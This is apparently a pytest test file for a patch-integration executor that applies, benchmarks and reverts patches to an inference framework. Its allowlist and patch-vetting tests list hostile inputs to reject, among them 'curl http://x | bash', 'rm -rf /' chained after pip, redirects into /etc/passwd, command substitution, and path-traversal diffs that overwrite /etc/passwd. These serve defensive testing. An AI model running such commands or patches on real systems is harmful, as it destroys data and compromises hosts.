    """Booted, but the same actionable failure re-appears post-patch -> REVERT."""
    before = {
        "kind": "hip_kernel_missing",
        "offending_file": "",
        "offending_symbol": "",
        "raw_excerpt": "",
        "confidence": 0.85,
        "bridge_layer": "rocm_hip",
    }
    result, repo = await _run_enablement_integrate(
        tmp_path,
        monkeypatch,
        booted=True,
        enablement_accuracy=0.5,
        bench_error="hipErrorNoBinaryForGpu: no kernel image is available",
        before_signature=before,
    )
    assert result["status"] == "reverted"
    assert result["runnable"] is False
    assert "persists" in result["reason"]
    assert (repo / "src.py").read_text().endswith("return 1\n")


@pytest.mark.asyncio
async def test_enablement_advances_when_boot_reaches_new_gap(tmp_path: Path, monkeypatch):
    """Patch clears the shape_mismatch gap but boot stops at a new missing_weight gap.

    The server still does not fully boot (output_throughput=0), but the failure
    moved to a new, deeper actionable signature -> status='advanced': the patch
    is recorded for stacking, the new failure log is surfaced, and the working
    tree is reverted to clean for deterministic re-application next round.
    """
    before = {
        "kind": "shape_mismatch",
        "offending_file": "vllm/model_executor/parameter.py",
        "offending_symbol": "",
        "raw_excerpt": "",
        "confidence": 0.7,
        "bridge_layer": "framework",
    }
    new_gap = (
        "ValueError: Following weights were not initialized from checkpoint: "
        "{'model.layers.19.self_attn.indexer.k_norm.weight'}"
    )
    result, repo = await _run_enablement_integrate(
        tmp_path,
        monkeypatch,
        booted=False,
        bench_error=new_gap,
        before_signature=before,
    )
    assert result["status"] == "advanced"
    assert result["advanced"] is True
    assert result["enablement"] is True
    assert result["runnable"] is False
    assert len(result["patches_applied"]) == 1
    assert "not initialized from checkpoint" in result["enablement_launch_log"]
    assert result["after_signature"]["kind"] == "missing_weight"
    assert (repo / "src.py").read_text().endswith("return 1\n")


@pytest.mark.asyncio
async def test_enablement_stacks_base_patches_before_new(tmp_path: Path, monkeypatch):
    """enablement_base_patches are applied before this round's patch (serial gaps)."""
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    repo = tmp_path / "framework"
    init_git_repo(repo)
    # A base patch touching a different file, plus this round's patch on src.py.
    (repo / "other.py").write_text("def g():\n    return 10\n", encoding="utf-8")
    git_commit_all(repo, "add other")
    base_patch = tmp_path / "base_000.patch"
    base_patch.write_text(
        "--- a/other.py\n+++ b/other.py\n@@ -1,2 +1,2 @@\n def g():\n-    return 10\n+    return 20\n",
        encoding="utf-8",
    )
    _write_specialist_workspace(session_dir, "t-spec-stack", patch_contents=[_VALID_PATCH])
    executor = IntegratePatchExecutor(session_dir=session_dir)

    async def _fake_bench(**_kwargs):
        return {"output_throughput": 200.0, "error": ""}, {
            "accuracy_pass": None,
            "enablement_accuracy": 0.5,
            "timed_out": False,
        }

    async def _noop_kb(**_kwargs):
        return None

    monkeypatch.setattr(executor, "_bench_patch", _fake_bench)
    monkeypatch.setattr(executor, "_maybe_write_framework_kb_record", _noop_kb)

    params = {
        "specialist_task_id": "t-spec-stack",
        "framework_source_root": str(repo),
        "enablement": True,
        "enablement_base_patches": [str(base_patch)],
    }
    result = await executor(_make_ctx("t-int-stack", params))
    assert result["status"] == "kept"
    assert len(result["patches_applied"]) == 2
    assert (repo / "other.py").read_text().endswith("return 20\n")
    assert (repo / "src.py").read_text().endswith("return 2\n")


@pytest.mark.parametrize(
    "cmd",
    [
        "pip install -U transformers",
        "pip3 install vllm==0.24.0",
        "python -m pip install foo",
        "python3 -m pip install foo",
        "uv pip install bar",
        "apt-get install -y gh",
        "apt install -y gh",
        "sudo apt-get install -y gh",
        "npm install -g @scope/tool",
        "PIP_NO_CACHE_DIR=1 pip install baz",
        # Version specifiers legitimately contain >/< and must be accepted;
        # the durable enablement env-upgrade replay depends on these (a bare
        # metachar guard used to silently skip every one of them).
        "pip install -U 'transformers>=4.58'",
        "pip install -U transformers>=4.58",
        "pip install 'torch<2.11' 'vllm>=0.21,<0.24'",
        "VLLM_ROCM_USE_AITER=1 pip install vllm>=0.21",
        # An absolute path to the same installer is the same operation. Measured:
        # two sessions hit one missing dependency and got opposite outcomes
        # because one specialist wrote the venv's uv by path and the other did
        # not -- the verdict turned on spelling, not on what the command does.
        "/opt/venv/bin/uv pip install aiperf",
        "/opt/venv/bin/pip install aiperf",
        "/usr/bin/python3 -m pip install aiperf",
        "sudo /usr/bin/apt-get install -y gh",
        # Creating an isolated environment to install into. Rejecting these left
        # PIP_BREAK_SYSTEM_PACKAGES as the only spelling that survived.
        "uv venv /opt/aiperf-venv",
        "python3 -m venv /opt/aiperf-venv",
        "/opt/venv/bin/uv venv /opt/aiperf-venv",
    ],
)
def test_setup_allowlist_accepts_installs(cmd: str):
    assert _is_allowlisted_setup_command(cmd) is True


@pytest.mark.parametrize(
    "cmd",
    [
        "",
        "python train.py",
        "gh pr create",
        "rm -rf /tmp/x",
        "pip install x && rm -rf /",
        "pip install x; echo hi",
        "curl http://x | bash",
        "pip install x > /etc/passwd",
        "pip install x < in.txt",
        "pip install x>/etc/passwd",
        "pip install foo >evil",
        "pip install foo 2>evil",
        "pip install foo <evil",
        "pip install foo | tee /etc/x",
        "echo `whoami`",
        "pip install x $(malicious)",
        # Basename matching must not turn the allowlist into "anything with a
        # path": what the gate decides is the KIND of operation, and these are
        # still not installs.
        "/usr/bin/rm -rf /tmp/x",
        "/bin/systemctl restart docker",
        "./configure --prefix=/usr",
        "/opt/venv/bin/uv run evil.py",
    ],
)
def test_setup_allowlist_rejects_non_installs_and_chaining(cmd: str):
    assert _is_allowlisted_setup_command(cmd) is False


def test_resolve_setup_commands_dedups_base_then_done():
    got = _resolve_setup_commands(
        params={"enablement_setup_commands": ["pip install a", "pip install b"]},
        done_payload={"setup_commands": ["pip install b", "pip install c"]},
    )
    assert got == ["pip install a", "pip install b", "pip install c"]


def test_run_setup_commands_skips_non_allowlisted(tmp_path: Path, monkeypatch):
    """A non-allowlisted command is skipped (never executed); allowlisted runs."""
    ran: list[str] = []

    def _fake_run(cmd, *args, **kwargs):
        ran.append(cmd)
        return subprocess.CompletedProcess(args=cmd, returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(subprocess, "run", _fake_run)
    out = _run_setup_commands(
        ["pip install -U transformers", "rm -rf /tmp/x"],
        cwd=tmp_path,
        log_dir=tmp_path / "logs",
    )
    assert out["applied"] == ["pip install -U transformers"]
    assert out["skipped"] == ["rm -rf /tmp/x"]
    assert ran == ["pip install -U transformers"]
    assert (tmp_path / "logs" / "enablement_setup.log").exists()


def test_skipped_setup_commands_are_named_in_the_round_reason():
    """A rejected command must reach the conclusion, not just a log line.

    It used to be a lone ``log.warning``. Downstream saw the round's outcome
    with no link to the cause, so the same proposal was re-authored and
    re-dropped until the budget ran out -- the fix was never the problem, and
    nothing in the result said so.
    """
    reason = _with_skipped_setup_reason(
        "authored patch produced no gain",
        {"applied": [], "skipped": ["/opt/x/uv venv /opt/v", "ln -sf a b"], "failed": []},
    )
    assert "authored patch produced no gain" in reason
    assert "REJECTED" in reason
    assert "ln -sf a b" in reason


def test_reason_is_untouched_when_nothing_was_rejected():
    base = "authored patch produced no gain"
    assert _with_skipped_setup_reason(base, {"applied": ["pip install x"], "skipped": [], "failed": []}) == base


@pytest.mark.asyncio
async def test_enablement_replays_setup_commands_before_boot(tmp_path: Path, monkeypatch):
    """Enablement integrate replays setup_commands and surfaces them in the result."""
    from hyperloom.orchestrator.actions.executors import integrate_patch as ip_mod

    session_dir = tmp_path / "session"
    session_dir.mkdir()
    repo = tmp_path / "framework"
    init_git_repo(repo)
    _write_specialist_workspace(session_dir, "t-spec-setup", patch_contents=[_VALID_PATCH])
    executor = IntegratePatchExecutor(session_dir=session_dir)

    replayed: dict[str, Any] = {}

    def _spy_run_setup(commands, *, cwd, log_dir):
        replayed["commands"] = list(commands)
        return {"applied": list(commands), "skipped": [], "failed": []}

    monkeypatch.setattr(ip_mod, "_run_setup_commands", _spy_run_setup)

    async def _fake_bench(**_kwargs):
        return {"output_throughput": 150.0, "error": ""}, {
            "accuracy_pass": None,
            "enablement_accuracy": 0.5,
            "timed_out": False,
        }

    async def _noop_kb(**_kwargs):
        return None

    monkeypatch.setattr(executor, "_bench_patch", _fake_bench)
    monkeypatch.setattr(executor, "_maybe_write_framework_kb_record", _noop_kb)

    params = {
        "specialist_task_id": "t-spec-setup",
        "framework_source_root": str(repo),
        "enablement": True,
        "enablement_setup_commands": ["pip install -U transformers"],
    }
    result = await executor(_make_ctx("t-int-setup", params))
    assert result["status"] == "kept"
    assert result["setup_commands_applied"] == ["pip install -U transformers"]
    assert replayed["commands"] == ["pip install -U transformers"]


def test_integrate_patch_executor_imports_clean():
    """The real executor module must import without side effects."""
    from hyperloom.orchestrator.actions.executors import integrate_patch as ip_mod

    assert hasattr(ip_mod, "IntegratePatchExecutor")
    assert callable(ip_mod.IntegratePatchExecutor)


_NOGIT_PATCH = """\
--- a/src.py
+++ b/src.py
@@ -1,2 +1,2 @@
 def f():
-    return 1
+    return 42
"""


def test_is_git_tree_non_git(tmp_path: Path) -> None:
    assert _is_git_tree(tmp_path) is False


def test_is_git_tree_git_repo(tmp_path: Path) -> None:
    subprocess.run(["git", "init", str(tmp_path)], check=True, capture_output=True)
    assert _is_git_tree(tmp_path) is True


def test_apply_patch_no_git_keep_and_revert(tmp_path: Path) -> None:
    framework_root = tmp_path / "fw"
    framework_root.mkdir()
    original = "def f():\n    return 1\n"
    (framework_root / "src.py").write_text(original, encoding="utf-8")

    patch_file = tmp_path / "change.patch"
    patch_file.write_text(_NOGIT_PATCH, encoding="utf-8")
    backup_root = tmp_path / "backups"

    ok, err, backups, *_ = _apply_patch_no_git(framework_root, patch_file, backup_root)
    pytest.importorskip("subprocess")  # ensure patch CLI available; skip gracefully if not
    if not ok:
        pytest.skip(f"patch CLI unavailable or patch failed: {err}")

    patched = (framework_root / "src.py").read_text(encoding="utf-8")
    assert "return 42" in patched, "patch was not applied"
    assert any(r["backup_path"] for r in backups), "backup was not created"

    _revert_patches_no_git(backups)
    restored = (framework_root / "src.py").read_text(encoding="utf-8")
    assert restored == original, "revert did not restore original content"


def test_apply_patch_no_git_rejects_path_traversal_before_apply(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    framework_root = tmp_path / "fw"
    framework_root.mkdir()
    outside = tmp_path / "outside.py"
    outside.write_text("SAFE\n", encoding="utf-8")
    patch_file = tmp_path / "escape.patch"
    patch_file.write_text(
        "diff --git a/../outside.py b/../outside.py\n"
        "--- a/../outside.py\n"
        "+++ b/../outside.py\n"
        "@@ -1 +1 @@\n"
        "-SAFE\n"
        "+PWNED\n",
        encoding="utf-8",
    )
    calls: list[list[str]] = []

    def fake_run(cmd, *args, **kwargs):
        calls.append(list(cmd))
        # Dry-run accepts the target so the test exercises Hyperloom's own
        # boundary check before real apply.
        if "--dry-run" in cmd:
            return subprocess.CompletedProcess(args=cmd, returncode=0, stdout="", stderr="")
        raise AssertionError("real patch apply must not run for escaping targets")

    monkeypatch.setattr(subprocess, "run", fake_run)

    ok, err, backups, *_ = _apply_patch_no_git(framework_root, patch_file, tmp_path / "backups")

    assert ok is False
    assert "escapes framework root" in err
    assert backups == []
    assert outside.read_text(encoding="utf-8") == "SAFE\n"
    assert len(calls) == 1


def test_derive_lane_enablement():
    """_derive_lane returns 'enablement' when params.enablement is set."""
    from hyperloom.orchestrator.actions.executors.integrate_patch import _derive_lane

    assert _derive_lane({"enablement": True}) == "enablement"


def test_derive_lane_perf_framework():
    """_derive_lane returns 'perf_framework' for framework_agent_authoring params."""
    from hyperloom.orchestrator.actions.executors.integrate_patch import _derive_lane

    assert _derive_lane({"framework_agent_authoring": True}) == "perf_framework"
    assert _derive_lane({"framework_agent_candidate_id": "x"}) == "perf_framework"


def test_derive_lane_perf_explore():
    """_derive_lane returns 'perf_explore' for plain explore params."""
    from hyperloom.orchestrator.actions.executors.integrate_patch import _derive_lane

    assert _derive_lane({}) == "perf_explore"
    assert _derive_lane({"specialist_task_id": "abc"}) == "perf_explore"


@pytest.mark.asyncio
async def test_bench_patch_holds_and_closes_serving_lease(tmp_path: Path):
    """phase-3 §3.1: the patch benchmark forwards a serving lease to run_grid
    and closes it, so it serializes on the whole-machine serving_slot instead
    of colliding with a concurrent GPU-specialist server (the observed
    ``reverted_smoke_fail`` root cause)."""
    from unittest.mock import MagicMock, patch

    from hyperloom.orchestrator.actions.executors import _ray_serving
    from hyperloom.orchestrator.actions.executors import integrate_patch as ip_mod
    from hyperloom.orchestrator.actions.executors._grid_runner import VariantResult

    session_dir = tmp_path / "session"
    session_dir.mkdir()
    config_path = tmp_path / "baseline.yaml"
    config_path.write_text("benchmark: {}\n", encoding="utf-8")

    executor = IntegratePatchExecutor(session_dir=session_dir)
    captured: dict[str, Any] = {}

    async def fake_run_grid(*args, **kwargs):  # noqa: ARG001
        captured["serving_lease"] = kwargs.get("serving_lease")
        return [VariantResult(name="v", extra_server_args="", extra_envs={}, status="succeeded")]

    lease = MagicMock()
    with (
        patch.object(ip_mod, "run_grid", new=fake_run_grid),
        patch.object(ip_mod, "materialize_config_with_envs", return_value=config_path),
        patch.object(_ray_serving, "maybe_serving_lease", return_value=lease),
    ):
        await executor._bench_patch(
            params={"config_path": str(config_path)},
            output_root=tmp_path / "out",
            extra_server_args_applied="",
            extra_envs_applied={},
            specialist_task_id="task-abcd1234",
        )

    assert captured["serving_lease"] is lease
    lease.close.assert_called_once()


@pytest.mark.asyncio
async def test_bench_patch_routes_variant_args_and_envs_separately(tmp_path: Path):
    from unittest.mock import patch

    from hyperloom.orchestrator.actions.executors import _ray_serving
    from hyperloom.orchestrator.actions.executors import integrate_patch as ip_mod
    from hyperloom.orchestrator.actions.executors._grid_runner import VariantResult

    config_path = tmp_path / "baseline.yaml"
    config_path.write_text("benchmark: {}\n", encoding="utf-8")
    executor = IntegratePatchExecutor(session_dir=tmp_path)
    captured: dict[str, Any] = {}
    extra_args = '--kv-cache-dtype fp8 --compilation-config \'{"mode": "max-autotune"}\''

    async def fake_run_grid(**kwargs):
        captured.update(kwargs)
        variant = kwargs["grid"][0]
        return [
            VariantResult(
                name=variant.name,
                extra_server_args=variant.extra_server_args,
                extra_envs=variant.extra_envs,
                status="succeeded",
            )
        ]

    with (
        patch.object(ip_mod, "run_grid", new=fake_run_grid),
        patch.object(ip_mod, "materialize_config_with_envs", return_value=config_path),
        patch.object(_ray_serving, "maybe_serving_lease", return_value=None),
    ):
        await executor._bench_patch(
            params={
                "config_path": str(config_path),
                "base_extra_args": "--base-flag value",
                "base_extra_envs": {"BASE_ENV": "1"},
            },
            output_root=tmp_path / "out",
            extra_server_args_applied=extra_args,
            extra_envs_applied={"VLLM_ROCM_USE_AITER": "1"},
            specialist_task_id="task-explicit",
        )

    variant = captured["grid"][0]
    assert captured["base_extra_args"] == "--base-flag value"
    assert variant.extra_server_args == extra_args
    assert variant.extra_envs == {
        "BASE_ENV": "1",
        "VLLM_ROCM_USE_AITER": "1",
    }


@pytest.mark.asyncio
async def test_executor_rebinds_base_from_live_current_best(tmp_path: Path, monkeypatch):
    """TOCTOU regression: when a task was queued at baseline tput/args, but an
    Explore KEEP advanced current_best before execution, bench must use the live
    stack top and REVERT if the measured tput sits below it."""
    from types import SimpleNamespace
    from unittest.mock import patch

    from hyperloom.orchestrator.actions.executors import integrate_patch as ip_mod

    session_dir = tmp_path / "session"
    session_dir.mkdir()
    repo = tmp_path / "framework"
    init_git_repo(repo)
    _write_specialist_workspace(session_dir, "t-spec-toctou", patch_contents=[_VALID_PATCH])

    executor = IntegratePatchExecutor(session_dir=session_dir)

    captured_bench: dict[str, Any] = {}

    async def _fake_bench(**kwargs):
        captured_bench["base_tput"] = kwargs.get("params", {}).get("base_tput")
        captured_bench["base_extra_args"] = kwargs.get("params", {}).get("base_extra_args")
        captured_bench["base_extra_envs"] = kwargs.get("params", {}).get("base_extra_envs")
        # Simulate 3801 — below the explore winner 4616.
        return {"output_throughput": 3801.0, "error": ""}, {"accuracy_pass": None}

    async def _noop_kb(**_kwargs):
        return None

    monkeypatch.setattr(executor, "_bench_patch", _fake_bench)
    monkeypatch.setattr(executor, "_maybe_write_framework_kb_record", _noop_kb)

    live_state = SimpleNamespace(
        current_best={
            "tput": 4616.0,
            "extra_server_args": "--no-scheduler-reserve-full-isl",
            "extra_envs": {"VLLM_ROCM_USE_AITER_MOE": "0"},
        },
        baseline_tput=1083.0,
        baseline_accuracy=0.95,
        specialist_patch_verdicts={"t-spec-toctou": "approve"},
        get_specialist_patch_verdict=lambda sid: "approve",
    )

    # Task params frozen at baseline time (stale).
    params = {
        "specialist_task_id": "t-spec-toctou",
        "framework_source_root": str(repo),
        "base_tput": 1083.0,
        "base_extra_args": "",
    }
    task = Task(
        task_id="t-int-toctou",
        kind="integrate_patch",
        state="queued",
        params=params,
        idempotency_key="t-int-toctou",
        requires_lanes=tuple(),
    )
    ctx = RunnerContext(task=task, lease=None, extra={"shared_state": live_state})

    with patch.object(ip_mod, "materialize_config_with_envs", return_value=tmp_path / "cfg.yaml"):
        (tmp_path / "cfg.yaml").write_text("benchmark: {}\n", encoding="utf-8")
        result = await executor(ctx)

    # Params must have been rebound to the live stack top.
    assert captured_bench["base_tput"] == pytest.approx(4616.0), "stale base_tput not replaced"
    assert captured_bench["base_extra_args"] == "--no-scheduler-reserve-full-isl", "stale base_extra_args not replaced"
    assert captured_bench["base_extra_envs"] == {"VLLM_ROCM_USE_AITER_MOE": "0"}, "live envs not propagated"

    # 3801 < 4616 → REVERT, not KEEP.
    assert result["status"] == "reverted", f"expected revert, got {result['status']}"


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "params,expected_envs,expected_args,expected_unset",
    [
        # Base stack layer merged with the candidate's own env levers.
        (
            {
                "base_extra_envs": {"VLLM_ROCM_USE_AITER_FP4BMM": "0"},
                "extra_envs_applied": {"VLLM_ROCM_USE_AITER_MOE": "0"},
            },
            {"VLLM_ROCM_USE_AITER_FP4BMM": "0", "VLLM_ROCM_USE_AITER_MOE": "0"},
            "",
            [],
        ),
        # Base args composed ahead of the candidate's args.
        (
            {"base_extra_args": "--async-scheduling", "extra_server_args_applied": "--kv-cache-dtype fp8_e4m3"},
            {},
            "--async-scheduling --kv-cache-dtype fp8_e4m3",
            [],
        ),
        # unset_envs drops an inherited key AND is reported, which a params-only
        # re-derivation of the config cannot see.
        (
            {
                "base_extra_envs": {"VLLM_ROCM_USE_AITER_FP4BMM": "0", "VLLM_X": "1"},
                "unset_envs": ["VLLM_X"],
            },
            {"VLLM_ROCM_USE_AITER_FP4BMM": "0"},
            "",
            ["VLLM_X"],
        ),
        # No levers on either layer.
        ({}, {}, "", []),
    ],
)
async def test_bench_patch_captures_effective_config(
    tmp_path: Path, params, expected_envs, expected_args, expected_unset
):
    """The bench reports the config off the variant it launched, not a re-derivation."""
    from unittest.mock import patch

    from hyperloom.orchestrator.actions.executors import integrate_patch as ip_mod
    from hyperloom.orchestrator.actions.executors._grid_runner import VariantResult

    session_dir = tmp_path / "session"
    session_dir.mkdir()
    config_path = tmp_path / "baseline.yaml"
    config_path.write_text("benchmark: {}\n", encoding="utf-8")
    executor = IntegratePatchExecutor(session_dir=session_dir)

    async def fake_run_grid(*_args, **_kwargs):
        return [VariantResult(name="v", extra_server_args="", extra_envs={}, status="succeeded")]

    task_params = {"config_path": str(config_path)}
    for key in ("base_extra_envs", "base_extra_args"):
        if key in params:
            task_params[key] = params[key]

    with (
        patch.object(ip_mod, "run_grid", new=fake_run_grid),
        patch.object(ip_mod, "materialize_config_with_envs", return_value=config_path),
    ):
        bench, _ = await executor._bench_patch(
            params=task_params,
            output_root=tmp_path / "out",
            extra_server_args_applied=params.get("extra_server_args_applied", ""),
            extra_envs_applied=params.get("extra_envs_applied", {}),
            specialist_task_id="task-abcd1234",
            unset_envs=params.get("unset_envs"),
        )

    effective = bench["effective_config"]
    assert effective["extra_envs"] == expected_envs
    assert effective["extra_server_args"] == expected_args
    assert effective["unset_envs"] == expected_unset


@pytest.mark.asyncio
async def test_enablement_keep_forwards_captured_effective_config(tmp_path: Path, monkeypatch):
    """The KEEP passes the bench's captured config through untouched."""
    captured = {
        "extra_envs": {"VLLM_ROCM_USE_AITER_MOE": "0"},
        "extra_server_args": "--kv-cache-dtype fp8_e4m3",
        "remove_args": [],
        "unset_envs": ["VLLM_X"],
        "args_mode": "append",
    }
    result, _ = await _run_enablement_integrate(
        tmp_path,
        monkeypatch,
        booted=True,
        enablement_accuracy=0.6,
        bench_effective_config=captured,
    )
    assert result["status"] == "kept"
    assert result["enablement_effective_config"] == captured


# --------------------------------------------------------------------------- #
# Structural vetting of an untrusted diff, before it reaches ``git apply``.
#
# ``vet_patches`` only runs at authoring time, so an explicit ``params.patches``
# entry and every fetched ``upstream_pr`` diff reach the executor unvetted. Two
# gates cover them: patch-root resolution, and ``_stage_apply``'s unified-diff
# and path checks. The invariant asserted here is the one they jointly hold.
# --------------------------------------------------------------------------- #

_NOT_A_DIFF = "#!/bin/sh\nrm -rf /\n"

_ESCAPING_PATCH = """\
diff --git a/../../etc/passwd b/../../etc/passwd
--- a/../../etc/passwd
+++ b/../../etc/passwd
@@ -1 +1 @@
-root:x:0:0
+pwned:x:0:0
"""

_BARE_ABSOLUTE_PATCH = """\
--- /etc/passwd
+++ /etc/passwd
@@ -1 +1 @@
-root:x:0:0
+pwned:x:0:0
"""

# Headers resolve to a real file, so patch-root resolution admits it; it carries
# no hunk, so only the structural gate in _stage_apply can refuse it.
_RESOLVABLE_BUT_NOT_A_DIFF = "--- a/src.py\n+++ b/src.py\n"


@pytest.mark.parametrize(
    "blob",
    [_NOT_A_DIFF, _ESCAPING_PATCH, _BARE_ABSOLUTE_PATCH, _RESOLVABLE_BUT_NOT_A_DIFF],
    ids=["not-a-diff", "dotdot-escape", "bare-absolute-header", "resolvable-but-not-a-diff"],
)
@pytest.mark.asyncio
async def test_executor_refuses_an_unvetted_blob_without_invoking_git(tmp_path: Path, monkeypatch, blob: str):
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    repo = tmp_path / "framework"
    init_git_repo(repo)
    _write_specialist_workspace(session_dir, "t-spec-vet", patch_contents=[blob])

    def _explode(*_a, **_k):
        raise AssertionError("git apply was reached with an unvetted patch")

    monkeypatch.setattr(
        "hyperloom.orchestrator.actions.executors.integrate_patch._git_apply_collect_feedback",
        _explode,
    )

    executor = IntegratePatchExecutor(session_dir=session_dir)
    result = await executor(
        _make_ctx(
            "t-int-vet",
            {
                "specialist_task_id": "t-spec-vet",
                "framework_source_root": str(repo),
                "apply_only": True,
            },
        )
    )

    assert result["status"] == "apply_failed"
    assert result["patches_applied"] == []
    assert (repo / "src.py").read_text().endswith("return 1\n")
